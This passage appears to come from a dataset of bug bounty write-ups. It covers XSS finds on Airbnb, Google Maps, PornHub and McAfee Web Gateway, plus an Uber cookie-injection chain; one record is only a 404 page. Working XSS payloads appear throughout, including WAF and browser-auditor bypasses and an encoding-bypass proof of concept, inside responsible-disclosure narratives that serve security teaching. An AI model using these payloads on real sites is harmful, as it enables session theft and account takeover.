https://www.airbnb.com/embeddable/listing_frame?city-link-index=;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//buer.haus/xss2.swf'//>&id=9978655 Source: \"is_render_for_embed\":true,\"embed_data_for_logging\":{\"external_page_uri\":\"/\",\"city-link-index\":\"\",\"</script><embed/test\":\"''/allowscriptaccess='always'/src='//buer.haus/xss2.swf'//>\",\"id\":\"9978655\",\"controller\":\"embed\",\"action\":\"listing_frame\"},\"trebuchets\":{}}--></script> Success?! Nope, of course not. That would be too easy. Although the XSS payload was executing for one person, it wasn't for anyone else. We deduced that the WAF was using some sort of fingerprinting of both IP and browser headers such as User-Agent. Even though it worked on one IP/computer, it would not work on the same IP with a different User Agent or browser. For some people it would redirect to the base domain and for others it would simply throw the generic WAF error. What options do we have here? On one hand, we know that it fingerprinted our history of requests. If we bombard a browser with the thousands of requests we sent to get to this point it may work. Practical? Not really. So the only other option is to go back to the drawing board and start manipulating the payload until it works for everyone. Abusing some of the tricks we've already discovered, we can butcher the payload enough that the WAF no longer treats it as a threat: URL: https://www.airbnb.co.uk/embeddable/listing_frame?</script><embed%20/test=''/+allowscript%00acces%00s='al%00ways'+sr%00c='//buer.haus/xss2.swf'>&city-link-index=&id=9978655'+on%00error=al%00ert%00(1) '&action Are we finished? Nope, lol. This payload works for Firefox but it gets blocked in Chrome because of XSS auditor. 5) The Universal Payload Using the same tricks we used to confuse the WAF, we were able to defeat the auditor. This involved abusing the null-byte attack and using tabs. The final payload that works in Firefox, Chrome, Safari and bypasses all layers of protections: https://www.airbnb.co.uk/embeddable/listing_frame?</script><em;<;>;<embed /test=''/+allowscript%00acces%00s='al%00%09ways'+%09%00s%09r%00c='//buer.haus/xss2.swf'><em;&city-link-index=&id=9978655'+on%00error=al%00ert%00(1)'&action 6) Unleashing the Kraken When you have an XSS filter, you are generally relying on it universally. Although this exploit only works against JSON encoded input, Airbnb is using JSON data heavily across their entire website. Now that we have a working payload, we started to hit the rest of the website. After a short bit of exploring, we discovered 7 additional vulnerable locations including a Stored Cross-Site Scripting issue instead of just Reflected. Stored! and more! Takeaways Every time we find a vulnerability we try to put together a couple of takeaways from it. What did we learn that we can reuse later? What did we do right? What did we do wrong? How could the company have prevented this from happening? There's a lot to learn from every vulnerability that you discover and report. XSS filtering is a gamble - we think the security machine has proven time and time again that it's not a good enough solution. Some companies have filters that may be close to perfect, but we doubt they will last. Consider this: people are using browser features implemented a year ago to exploit filters built 2-3+ years ago. Developers simply cannot write code that predicts the future of browser security. Perseverance. Hit something constantly until you fully understand what is happening. If you can't, save it to a notepad and come back to it at a later date. There's a lot of bounty reports that are discoveries from a year prior but were not fully exploitable until a year later. It can be a mix of just learning more over the span of a year or having a moment of eureka. WAFs are great, but they aren't perfect. With that said, the WAF on Airbnb was actually pretty solid. Also, as a developer you need to be careful striping garbage from a request because it can be a quick way for an attacker to circumvent WAFs and browser XSS detection. Thanks Ibrahim Mosaad (the_storm) for ideas on how to bypass browser auditor. Timeline Discovered: 5/8/2016 Reported: 5/9/2016 Fixed: 5/20/2016"}
{"source_url": "https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff", "title": "How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) | by Marin Moulinier | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found a $5,000 Google Maps XSS (by fiddling with Protobuf) | by Marin Moulinier | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) Marin Moulinier 16 min read · Mar 9, 2017 -- 12 Listen Share A few months ago, I used Google Maps. Or maybe Google Street View, I love Street View, it’s like a retrofuturistic way to teleport. Routinely, I looked at the address bar. Since sometime in 2014, parameters are not the mere query string they used to be. Instead, it’s a weird mash of alphanumeric characters separated by exclamation points. It’s abstruse, it has no public documentation whatsoever, it’s used by people everyday, it’s a reverse engineerable protocol. That’s the kind of code I want to break. The Google Maps URL parameter format I also looked at the browser’s web console. Not only requests to the AJAX API were encoded the same way, but if some of responses were images, others were a novel signature followed with cryptic binary data. With that much mystery to solve, what could restrain any more my motivation? Nothing. Opening the hood Google Maps is a piece of about 3.2 MB of minified Javascript. Google Earth felt heavy — yesterday’s Google Maps was a dumb slippy map, today’s Google Maps has a Earth mode. It renders 3D graphics with WebGL, has large tiles, requests and display caching, scheduling and planning modules implemented in Javascript, and all that stuff . With a codebase of this size, you got to be organized. That’s fortunate, all (both) major browsers have landed their own debuggers these last years, as in, breakpoints can be set in any functions you wish to, and even when an AJAX request or a DOM event fires. Most things in reverse engineering have either a static or dynamic way to solve, I’m mostly a static guy that will use dynamic analysis in extreme cases, because I like detail and the sweet feeling of losing itself to assembly. This will however get useful a bit later. Let’s get to the code — Google Maps loads about eight Javascript code files, some in workers and through XMLHttpRequest, that have linebreaks only to separate modules. Javascript modules are designated with two or three-letter codes in the URLs. It’s minified with Closure Compiler , Google’s minifier which can inline functions, put half of your function’s statements in a conditional expression, separated with simple commas, and even more magic. Getting back code to readable enough (indented) is doable within your browser web’s console, or with a simple tool like http://jsbeautifier.org/ . Press enter or click to view image in full size The requests loading Google Maps’s source, and some minified code Getting used to read this kind of output may frighten some, but is not very hard. Just like when you read assembly, you learn to go straight to the point: search for strings and constants a lot, jump from a referred to function to another, take notes in your txt, sometimes, guess what the function could be doing upon a look, and all these things. For example, what could searching for an exclamation point string do… Oh already. Press enter or click to view image in full size Some of the code of the function that does the mysterious kind of URL encoding — apparently. With observation, you quickly notice that URLs parameter strings (shown again in screenshot below) are made of, repeated indefinitely: An exclamation point: the separator. A number: it looks like an integer key, in a key/value pair. A single letter: it’s a type that determines what follows. “s” is a string, “i” is an integer, but there’s more… Either a number, or a string: the value in the key/value pair. Press enter or click to view image in full size A screenshot from Chrome’s web console, showing requests to various AJAX endpoints. Could it be a novelty serialization format? In fact, after sorting out what I could remember about serialization, it wasn’t novelty. It was Protobuf. Protobuf is a format that’s used for (storing, enabling communication with) absolutely anything at Google. It was modestly developed as version 1 in 2001, made public as version 2 in order to overthrow XML in 2008, improved somewhat as version 3 in 2016, and now it’s mostly what will power your communication with “Google’s new API platform” and it’s used more and more in the web frontend parts of Google products, now that it is everywhere in Android’s. However, Protobuf is mostly transported (on the network) as binary data. We found text. When you create a program using Protobuf , you first define (in a format, called .proto, that has a slightly C-looking syntax) pairs of key-value fields, where each field has a type, a name and a number. Moreover, you put these fields in blocks having names, called messages; a field can be an integer, a string, or made up of another message (it’s called a nested message). There are also other types I won’t describe now. Samples of what Protobuf message definitions looks like (.proto format). Then, you compile your .proto to code. That’s right, code in any language you want (there are many bindings) that will allow you to either read or write the Protobuf messages you defined, fast. In our example, the “Person” Protobuf message is turned into a “Person” Java class The programmer then sets Protobuf fields to its data (through calling code that was generated at the previous step), and when it’s done tells the library to serialize it in a binary form. The programmer invokes the “Person” class and sets data Resulting data is encoded as such: 8-bit tags where you have 5 bits for the field number, 3 bits for the field data type; then, the actual data: an integer or string or bytes or message or… (there are twelve different integer types , with half as much ways to encode them on the wire). Data is serialized in a binary form So, could the URL parameter data be the same thing, encoded using text instead? That would have barely identical meaning, in the format used to encode URL information. It turned out that while there are only five different data types in the binary format (0: variable-length integer, 1: fixed 64 bits, 2: string or bytes or message, 5: fixed 32 bits, 3 and 4: groups that were basically a deprecated way to define messages — just enough information to skip content you don’t want or know how to read without interpreting it), there are 18 different characters that can sit as the letter designating type in Google Maps’ URL. // This function, found in Google Maps' code, says which type character should map to what default field value: dba = function(a) { switch (a) { case \"d\": case \"f\": case \"i\": case \"j\": case \"u\": case \"v\": case \"x\": case \"y\": case \"g\": case \"h\": case \"n\": case \"o\": case \"e\": return 0; // Those are integers (and enum)... case \"s\": case \"z\": case \"B\": return \"\"; // Those are string/bytes... case \"b\": return !1; // This one is boolean... default: return null // And there's also \"m\" for messages, referenced in further serialization code } }; That’s just about the number of types you can use when you define fields in your .proto. But, which one maps to which? Also, could we reconstruct all the fields used in Google Maps’ URLs into readable .proto definitions; so we can edit and replay messages, and find possibly hidden fields? Which approach to use? We’ll reply to this very soon. No, we’ll think about this right now: the function calls that defines Protobuf messages and their fields seem to be scattered around multiple functions, across Javascript code. It would be hard to scrape with a bunch of regexes, and we are lazy today. Press enter or click to view image in full size We don’t want to make sense of this. What about a dynamic approach: positioning ahead of the function that serializes the “!”-separated URL data, waiting for structure information to come, somehow automating the use of the debugger? Communicating with that magic silicon-traversing glue called code, that allows you to talk to machines like you do with humans? The first magical script Yep, it turned out Chrome has a debugger API that even powers the debugger (the debugger is itself a bunch of HTML and browser Javascript that communicates with this API through Websocket). And Firefox and Safari and Edge and others have too, even though it’s not perfectly portable . Anyway, Chrome’s one works a bit better, so we’ll use Chrome’s. As matter of a fact, it’s even meant to replace most PhantomJS uses once a feature called “ headless Chrome ” will land. The first part connecting to it is launching your usual Chrome, with the --remote-debugging-port=<port number> flag. Connecting to the specified port leads you to a HTTP server, on which you make a request to the “/json” endpoint that conveniently lists active tabs and Websocket URLs to connect to the debugger API for each. Then, you exchange JSON request/response/event messages on the socket in a simple way. A request will have a constant ID and map either to a response or error; events can be enabled using specific requests. Press enter or click to view image in full size Some Websocket communication between Chrome and the Chrome developer tools (captured using Chrome developer tools themselves) Let’s get our hands dirty: we’ll first call “Runtime.enable” in order to catch the “ Runtime.executionContextCreated ” event, that will fire when a page’s Javascript execution context is created; then, “Debugger.enable”, enabling the “ Debugger.scriptParsed ” event to fire when a script is loaded so we can look at it, and find functions that interests us to put breakpoints at these; “Network.enable”, so that we are notified about all HTTP requests in order to see which ones contain “!”-encoded data that we intercepted at Javascript level, and make a direct link between .proto definitions and HTTP endpoints; and finally “ Page.navigate ”, a simple way to tell “Browser, lead us to Google Maps!”. Code snip: some commands sent at Websocket creation, and the begin of event loop When a new script is seen, the “ Debugger.scriptParsed ” event is triggered. We then call “Debugger.pause” (in order to avoid any race condition) and “ Debugger.getScriptSource ”, that will give us ability to find our relevant function with a regex or string signature, and call “ Debugger.setBreakpoint ” to set a breakpoint, specifying script ID, line and column numbers. Here is the Javascript function that we want to break in: _.Eqa.prototype.H = function(a, b) { var c = Array(Fqa(a, b)); Gqa(a, b, c, 0); return c.join(\"\") }; It takes two arguments: “b”, a Javascript object that defines the structure of the Protobuf message; “a”, another, simpler object that defines message data, that will be serialized using this structure; and returns “c”, the raw “!”-separated data string. “Fqa” calculates the size of the output array (4 * the number of fields, each field being made of four substrings that will be joined together: separator, field number, type character, field value), “Gqa” writes to it, String.prototype.join converts it to string. So we’ll want to look at “b” and get it into a readable .proto, and remember “c” for later, so we can observe in which request it is sent. This means putting a breakpoint on the last line. Here’s what argument data looks like seen from the debugger: Press enter or click to view image in full size Sample data for the “a”, “b” and “c” local variables, respectively. After some deduction, we conclude “b” structure’s would look like this: However, I have shown you a readable version, just figure the same with random letters instead of any text names and no comments. Most object attributes are minified (and change depending on the minifier run), so we’ll have to use regexes on code to know which attributes correspond to what information. We understand what this data means: next, generate the actual .proto. We could access directly variables and object attributes through the debugger API, however, this would be awfully slow so we can’t really. We could try to convert it to JSON, but this will mostly not work, as nested messages can refer to their parent, and this would result in circular references (references to a parent object from its children). Third and right solution: just inject Javascript, let it do the work, return the string through any medium (I’ll use the console API for reasons). Javascript can be evaluated through the “ Debugger.evaluateOnCallFrame ” call locally, “ Runtime.evaluate ” call globally. Conveniently, you are notified of console messages through the “ Runtime.consoleAPICalled ” event. In addition to capturing network requests (“ Network.requestWillBeSent ” event), we’ll also inject another bit of Javascript in order to hook the history.replaceState() API function, so we know when the main page changes its URL containing “!”-separated state data. Some more code written, we launch the script controlling our Chrome instance, we conduct some Google Maps interaction to let it collect data, we now have the two elements we needed: reconstructed .proto structures, samples of URLs with the serialized data. The former will be written to disk in their regular form, the latter as convenient JSON with samples of requests put in arrays for every endpoint. Some of the reconstructed .proto data Some of the network endpoints, with captured data samples for each Great. Now, what should we make of this? The second nifty program I don’t know if you like large control panels full of buttons, I bet you love picking randomly at these when you can. That’s what we’ll construct out of the dataset we cultivated. Protobuf messages are conveniently rendered as the GUI element called tree view; handy manipulation would be hard in mere command line. Protobuf fields inferred out of the structures we seen have no names. We assigned one-letter names to them, as in minified code. We want to name them after what they actually do, for that, we’ll observe, and a convenient way to observe fast (for example, using your mouse wheel to mutate an integer field) would be great. We also want to test all values, so basically, as we know what they do, we could for instance integrate reverse engineered structures elsewhere to build something brand new, or see whether some of them induce an interesting behaviour security-wise… I like to use Python for everything, the first script used Python, the second one will use Python with Qt. The solution looks simple: using the QTreeWidget widget to render the message, each field will be a subclassed QTreeWidgetItem (with children widgets such as QLabel for text, QSpinBox for integers, etc.). The code will eventually get to look a little bit entangled, as we’ll have to handle cases such as repeated fields (duplicating themselves on the UI when you fill one first), states of a field being checked, present in request, etc. But overall readable and way understandable. The output page will be rendered live using QtWebEngine , the convenient Qt module that superseded QtWebKit and allows you to integrate Blink (in fact, a larger detached portion of Chromium) as a frame in your application. Also, a text area to display side information such as response hash, size, response code, mimetype. So, you touch buttons, I want the response to render live, and slick experience, got it? Got it, after a few more hundred LoC, it’s implemented and shiny. Press enter or click to view image in full size The Protobuf editor, our second creation, a slick way to edit and replay network data we captured at the previous step. The 0-day The whole request to the endpoint requesting a Google Maps tile ( https://www.google.com/maps/vt ) has about 730 fields, scattered around 125 messages. From a security point of view, that’s great, because that’s attack surface, and as much of these fields are implicit, hidden and required a reverse engineering work to get there, that’s as much things untested from the public we can see. Now I kept testing a lot of fields by hand, sometimes documenting what they do. Most of these didn’t seem to do anything in the current setup I tried them. Eventually, I sorted out the important parts of the request. First, the coordinates on the map. There are multiple ways to describe these, regular decimal WGS84, or a larger and more precise coordinates unit, useful for the satellite view, and there are also other ways to define a viewport, for example if you want a map of a given pixel size to cover a precise area. There’s basically every way you would want to render a map. There are also all kinds of map layers, options to render labels on the map, position markers, draw an itinerary from a direction to another, cover all Maps features being drawn server-side, etc. But more important, it doesn’t only render bitmap. It also renders vector; the Android application used vector for years, the web more recently and for part of the requests. There are multiple formats for vector, all of these are proprietary. The former was a regular binary format (signature “ DRAT ”), with binary structures convenient to what it’s meant to store (map rendering data), and a version number to determine when a fields appears, changes meaning or disappears; data was obfuscated out of a simple RC4 key made out of tile coordinates, a fixed key and a nonce (I found a research paper (p. 71) briefly describing it, with a now outdated decryption key) and ZLIB, and is still in use by the Android application. The proprietary “DRAT” format is used to transport maps in a vector format to the Android client. The new one, integrated to the web application just uses binary Protobuf — again, that’s a second form of Protobuf in the web app. A single-byte xor is used instead of RC4, what a ramp up in efficiency. That’s the binary data sent through AJAX that we mentioned earlier, encapsulated in a mere length-value container format (signature “XHR1”). Transmitted data has mostly the same meaning as in the old (I made a small script to mostly render it to SVG just to spend time, it kind of works but would hardly be useful to a lot of people and could attract C&D’s, so this is left as an exercise for the reader). You can pick any of these formats versions, more than a dozen. One of these versions, specifically, was interesting. How? It was output with a “Content-Type: text/html” header. Yet, it was plain binary data. It was Protobuf-based like the new format, yet it had the header of the former one, so it had the same RC4+ZLIB processing. However, having a lot of options is interesting in security. And so there was a field that disabled encryption, and another one for compression. And you had raw map data, including the raw strings for places and markers, served as text/html to your browser. What’s a cool way to inject arbitrary strings to the map? Placing markers ! Editing other request fields does allow you to do that. Placing a arbitrarily named marker on the map, by editing request information. On this screenshot, this is done while requesting map tiles in a raster format (PNG). Once you try to do that while also setting fields relevant to enabling the undocumented format we found, the Javascript alert box valiantly shows up! Our original XSS payload looked like this. 🎉 Let’s be even more clever and see what fields can be encoded without using any HTML-related chars. Browsers such as Chrome have filters to detect and block XSS when HTML is present both in request and response, that’s also the case of Firefox with extensions such as NoScript. Filter-escaping wit comes in here! The “!”-separated data decoding routine accepts two data types corresponding to strings, even if it’s originally one Protobuf type. The “s” type character allows you to encode strings raw as part of the output string, only with “!” and “*” escaped as “*21” and “*2A” (the corresponding hex codes). The “z” character type allows you to encode the string as base64 (simple flavour, without padding). Know what, filter-based XSS defences are rendered useless. The same payload, once the HTML string was base64-encoded. And you can obfuscate even more, as it turned out the server converts on the fly the “!”-separated data to raw binary Protobuf, and most types are cast without check, and remember, strings and messages both share the same of the five data types in binary format. So, you can simply convert nested messages to binary, and pass them as strings, exposing even less what they do, and look more cool. The same payload, once we converted nested messages to wire format, then cast to base64 string — now that’s unintelligible. Now we have a XSS payload that will work with anything — Chrome, Firefox, Safari, whatever accepts Javascript — on the www.google.com domain, as the former maps.google.com was dropped to put back the service on the main domain… Just for the sake of cleverness, let’s find another way. It turns out anyone can submit new places to Google Maps, that may appear on the map with more or less moderation (a posteriori). Did someone submit a <script>alert(1)</script> place to the map already? Sure, some Chinese and Indian guys did, one even showing off its hacker face of dread! Press enter or click to view image in full size With Google Maps, find nearby hot hackers from your area A payload leveraging an existing place on the map. We have four exciting ways to exploit this neat 0-day — this looks enough. Let’s move to the next step. Vendor response Google provides standardized rewards for most security bugs, as described on the page for its vulnerability reward program . In our case, a proper XSS on the www.google.com domain will usually trigger a $5,000 bounty. Day 0 — I fill in the report form . Day 0.54 — My report is triaged, already! Day 0.64 — My report is validated, bug filed. Day 1 (or so) — Well, this is fixed. Day 1.84 — Press enter or click to view image in full size You know what, great bounty gets turned into motivation, and great motivation gets turned in open-source. The project The code linked to this research since got a bit more substantial: I looked around for more, and seen that a lot of applications on the Android platform (including Maps’) use Protobuf, and it seemed to have a lack of an unified tool for extracting these structures (a few localized scripts existed but targeted specific apps or implementation flavours, and mostly didn’t support Proguard). And desktop apps, mostly in C++ existed in addition to mobile Java stuff. So I started to glue together scripts I wrote on a few occasions, put a same GUI behind, added a few features, and it started to look like something. You can find the current state of the project that departed from this at https://github.com/marin-m/pbtk . Here are the main parts of the code discussed above: extractors/web_extract.py : that’s the main extraction .proto script, that launches Chrome, connects to its depths and does the stunning work. You can use it individually, just pass an URL as an argument. views/fuzzer.py : that’s the little GUI editing and replaying requests. It’s now integrated to the larger app, and that you can play with launching the GUI (gui.py) and clicking “Step 3…”. It will look for .protos stored in a folder of you home directory, as explained in the interface. In addition, the code required to encode back and forth URL parameters in the “!”-separated format is bundled as a module in utils/pburl_decoder.py . It is included by the previous. That’s the end of this note — hope you appreciated it, and see you later for more reverse engineering adventures! Programming Reverse Engineering Protobuf Python Security -- -- 12 Written by Marin Moulinier 544 followers · 1 following https://github.com/marin-m Responses ( 12 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://whitehatnepal.tumblr.com/post/153333332112/xssonebay", "title": "Not found.", "friendly_explanation": "This is a bug bounty writeup from https://whitehatnepal.tumblr.com/post/153333332112/xssonebay. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNot found. There's nothing here. Whatever you were looking for doesn't currently exist at this address. Unless you were looking for this error page, in which case: Congrats! You totally found it. Log in Sign up Search Log in Sign up"}
{"source_url": "https://www.jonbottarini.com/2017/03/16/penetrating-pornhub-xss-vulns-galore-plus-a-cool-shirt/", "title": "Penetrating PornHub - XSS vulns galore (plus a cool shirt!) - Jon's Personal Blog", "friendly_explanation": "This is a bug bounty writeup from https://www.jonbottarini.com/2017/03/16/penetrating-pornhub-xss-vulns-galore-plus-a-cool-shirt/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPenetrating PornHub - XSS vulns galore (plus a cool shirt!) - Jon's Personal Blog Jon's Personal Blog Jon's Personal Blog Home About Me Blog Twitter LinkedIn YouTube March 16, 2017 Penetrating PornHub – XSS vulns galore (plus a cool shirt!) When PornHub launched their public bug bounty program, I was pretty sure that most of the low hanging fruits of vulnerabilities would be taken care of and already reported. When I first started poking around, I found my first vulnerability in less than 15 minutes. The second vulnerability was found a few minutes afterward. I have never in my entire bug hunting career found bugs this quickly, so it was pretty exciting. In return, I received two payments of $250 and a really really cool T-Shirt + stickers that I posted on Reddit here: When I posted this on Reddit I had no idea it would be so popular and raise so many questions. Most people asked “What was the hack?” followed by “Why would you hack PornHub?” and I couldn’t talk about it until…now. (These vulnerabilities have now been fixed.) I found and reported two reflected cross-site scripting (XSS) vulnerabilities within 20 minutes of browsing the PornHub Premium website. Cross site scripting, if you don’t know what that is, is a type of vulnerability that enables an attacker to run dangerous scripts on a website. OWASP sums it up pretty nicely here: An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. The first one was found using the “redeem code” section of the site – it didn’t check to see if the code being entered in the text input for the redeem code was an actual payload, so I was able to use the following payload to reflect the script on the page: PAYLOAD+STACK++%3E%27\" /Autof<K>ocus /O<K>nfocus=confirm`1`//&error=1 The first part of the payload “PAYLOAD STACK” ensures that the rest of the payload is sent through. If I entered: ++%3E%27\" /Autof<K>ocus /O<K>nfocus=confirm`1`//&error=1 Without the words in front of it, the application would reject it and nothing would appear on the page. Entering something non-malicious to begin would trick the validator, and in turn, allow the payload to execute. The second vulnerability was also a XSS. This was was a bit simpler, and was found by entering a payload in a URL parameter that only appears once to new users… which is why I think it wasn’t found until now – most bug hunters like to get a feel of a website before they start poking around and trying to get things to break, but usually I take the different approach and use incognito windows so that the website thinks it’s the first time I’ve ever visited the site before. This is where the vulnerability existed. I noticed that the PornHub Premium site was mostly off-limits unless you paid to access it. Before you could even pay, there is a “pop-up” window that displays to the user that they are going to be viewing pornography and to either enter or exit by clicking on a button. What I also noticed is that once you selected “enter”, there was a part of the URL that changed and added a parameter. This vulnerable parameter was &compliancePop=no_gateway – this is where I was able to enter: &compliancePop=no_gateway%22-confirm`1`-%22 And I got a really nice “1” to appear on the screen, which shows evidence of cross-site scripting. I reported both of these vulnerabilities to PornHub and they were triaged within 24 hours. I’d like to thank the folks at PornHub for running such a fair, quick responding program and keeping their users safe. Also – thanks for the amazing T-Shirt! Thanks also to the folks at Reddit for being so interested in this that I had to send over 200 pm’s to people who wanted to know what I did…hopefully this lives up to the promise that I would tell you about it, and sorry it took so long. I have other bugs and vulnerabilities that are cooler and more intense than this one coming soon, so check back later and I’ll share them with you. Additionally, you can follow me on Twitter to stay up to date with my bugs and what I’m doing, if you wish. In Cross Site Scripting (XSS) pornhub , reddit , xss Discovering a stored XSS that affects over 900k websites (CVE-2016-9751) Inspect Element leads to Stripe Account Lockout Authentication Bypass © 2024 Jon's Personal Blog"}
{"source_url": "https://blog.ettic.ca/near-universal-xss-in-mcafee-web-gateway-cf8dfcbc8fc3", "title": "Near universal XSS in McAfee Web Gateway | by Olivier Arteau | etticblog | Medium", "friendly_explanation": "This is a bug bounty writeup from https://blog.ettic.ca/near-universal-xss-in-mcafee-web-gateway-cf8dfcbc8fc3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNear universal XSS in McAfee Web Gateway | by Olivier Arteau | etticblog | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in etticblog · ETTIC is the Offensive Security team at Desjardins. We specialize in Penetration Testing, Threat Modeling, Application Security, Offensive Proactive Research, Purple Teaming, and Adversary Simulation. Near universal XSS in McAfee Web Gateway Olivier Arteau 4 min read · Mar 17, 2017 -- Listen Share In this blog post, a vulnerability in the McAfee Web Gateway will be presented. The vulnerability was disclosed on September 15th 2016 to McAfee and was fixed on October 12th 2016 with the release of Web Gateway 7.6.2.5. XSS are a common vulnerability in web application, but the one presented here is of a very different nature from the ones we typically see. But first let’s look at how the product works at a high level. McAfee Web Gateway is essentially an enterprise proxy server that will filter the content based on rules. It allows company to control what people can visit when they are within the company network. To properly work, the McAfee Web Gateway also generates a root certificate that can be installed on the devices of the company. This allows the proxy to change the response of HTTPS traffic to something else. The main use case of this traffic alteration is to display custom HTTP error when a domain is blocked or doesn’t exist. When it happens, a page like the one below is returned to the user. Press enter or click to view image in full size Image Source : https://kc.mcafee.com/library/MCAFEE/CORPORATE_USER/CORP_TS_AGENT/Webwasher/KB69994_f.png What initially got me interested about this page was that the entire requested URL was visible in the response. Looking at the HTML of the page, we could see the following HTML. <!-- Info --> <table class=”infoTable”> <tr> <td class=\"infoData\"> <b>URL : </b><script type=\"text/javascript\">break_line(\" http://d igg.com\");</script><br /> </td> </tr> </table> <!-- /Info --> The break_line JavaScript function had, at the time, the following definition. It essentially inserts a “<wbr />” tag every 20 characters and outputs the content directly in the page. function break_line(lineToBreak) { if (lineToBreak != '') { var len = lineToBreak.length; var splitStr = '<wbr />'; for (var i = 0; i < len;) { lineToBreak = lineToBreak.substring(0, i) + splitStr + lineToBreak.substring(i); i += 20 + splitStr.length; len += splitStr.length; } document.write(lineToBreak); } } The next question I asked myself was which encoding did it applied to the reflected URL ? With minimal fuzzing, I found that it takes the received URL and does an HTML encoding for the key HTML character (<, > and “). But is it the correct way to encode it ? To explore this question we first have to look at the context in which it’s reflected. The reflected URL passes in two contexts. The first one being a JavaScript string and then in an HTML context (the break_line function). The correct way to encode content is to apply a context specify encoding for each context that it will be passed to from the last context to the first one. In this case, it means doing an HTML encoding and then a JavaScript encoding ( result = javascript_encode(html_encode(data)) ). If we come back a bit we know that it’s only doing an HTML encoding, which means that the JavaScript encoding is missing. One of the interesting things that can be done when one of the context specific encoding is missing is to use alternate character encoding. In HTML “a” can also be written as “&#97;” and in JavaScript “a” can also be written as “\\x61” and “\\u0061”. Since the HTML encoding won’t encode the “\\” character, we can rewrite character that would normally be encoded by the HTML encoding using an alternate JavaScript encoding (“<” changed to “\\x3c”). This basically allows us to output any character and bypass the HTML encoding. But the journey towards a fully functional proof of concept doesn’t stop here. If we remember previously, the JavaScript function break_line inserts a <wbr /> every 20 characters and this will get in the way of a standard XSS payload. So we need a way to write longer payload or bootstrap them. The easiest way that I found to deal with this limitation is to start each 20 characters segment with a */ and end it with a /*. This places the <wbr /> tag in JavaScript comment. This leaves us with 16 characters per segment. One of the solution that I found, was to use this as the first segment \\x3cscript\\x3e/*AAAAAAAAAA*/a=String;b=/*AAAAA*/a.fromCharCode(/*A*/ Use this as the last segment. */);eval(b);/*AAAAAA*/\\x3c/script\\x3e Use the other segments to provide the ASCII value for each character of our JavaScript payload. With this, I was able to make a first functional proof of concept. http://aaaa.perdu.com/favicon.ico?AAAAAA\\x3cscript\\x3e/*AAAAAAAAAA*/a=String;b=/*AAAAA*/a.fromCharCode(/*A*/97,108,101,114,/*A*/116,40,119,105,/*A*/110,100,111,119,/**/46,108,111,99,/*AA*/97,116,105,111,/*A*/110,41/*AAAAAAAAAA*/);eval(b);/*AAAAAA*/\\x3c/script\\x3e Do note that for longer payload, using an intermediate payload along the lines of eval(unescape(location.hash.substr(1))) and placing the full JavaScript payload after the “#” in the URL is a lot more practical. So we can now execute any arbitrary JavaScript with our XSS, but for it to be useful we have to understand how to trigger those error pages. The most reliable way to trigger it is by visiting an URL where the domain doesn’t resolve to anything. Most domain name don’t catch all subdomains which means that you can get for most domain an XSS on doesnotexists.maindomain.com. While this doesn’t give you a direct access to other subdomains or the main domain, the browser gives special privilege to subdomain like setting cookies for *.maindomain.com . Also, since any request will be performed from a subdomain of maindomain.com, if the server trust its subdomains for CORS request, it can also lead to data stealing. Another way to trigger the error page for arbitrary domain is when the proxy is flooded and can no longer respond to request. This is in practice hard to obtain reliably, but will allow an XSS to be obtained on any domain. The XSS payload simply has to wait for the flood to end and then make any request with XHR. There are probably other ways to trigger those error pages, but I don’t know the product well enough and the proof of concept was already interesting enough to warrant a fix. JavaScript Web Development -- -- Published in etticblog 60 followers · Last published Feb 18, 2025 ETTIC is the Offensive Security team at Desjardins. We specialize in Penetration Testing, Threat Modeling, Application Security, Offensive Proactive Research, Purple Teaming, and Adversary Simulation. Written by Olivier Arteau 11 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://httpsonly.blogspot.com/2016/08/turning-self-xss-into-good-xss-v2.html", "title": "My \"Public Evernote\": Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded", "friendly_explanation": "This is a bug bounty writeup from https://httpsonly.blogspot.com/2016/08/turning-self-xss-into-good-xss-v2.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy \"Public Evernote\": Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded My \"Public Evernote\" Monday, 29 August 2016 Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded This appears to be the issue which I was digging for the most time during my bugbounty experience, it took more than two months to find a perfect solution for a problem. TL;DR I found Self-XSS on m.uber.com in late March 2016, and inspired by Jack's post I didn't give up, aiming to find a way to turn it to Good-XSS. Finally, I found arbitrary cookie install vulnerability on business.uber.com , which allowed to install arbitrary cookies for *.uber.com for Safari users. Chaining two bugs together could lead to Good XSS on m.uber.com , and allowed to steal oauth2 cookie of any logged-in user. Another bughunter reported Self-XSS on the same domain while Uber team was resolving my issue, which resulted a fix of Self-XSS and refusal of appropriate reward. Chaining bugs. Step 1 : Self-XSS Self-Stored XSS on m.uber.com launches on index page when user simply logges in. My way to add XSS into profile was by modifying existing business profile name via mobile application. As it appeared later, there was another way to do that . Step 2 : Arbitrary cookie installation Surprisingly, user can be authenticated on m.uber.com by only presenting COOKIE \" token \", apart from (riders|login|partners|anything).uber.com , which needs another COOKIE - oauth2 . Hence, if it is somehow possible to login victim user into our account with Self Stored XSS, it is possible to steal oauth2 cookie of a real user (since it is scoped to *.uber.com ) and perform any other malicious actions. Arbitrary cookie install vulnerability was very lucky to find on page https://business.uber.com/new/confirm/[exploit-here] , and is based on the fact that user input comes into server's response, directly into Cookie header and is not properly sanitized. Hence it was possible to install various cookies for any 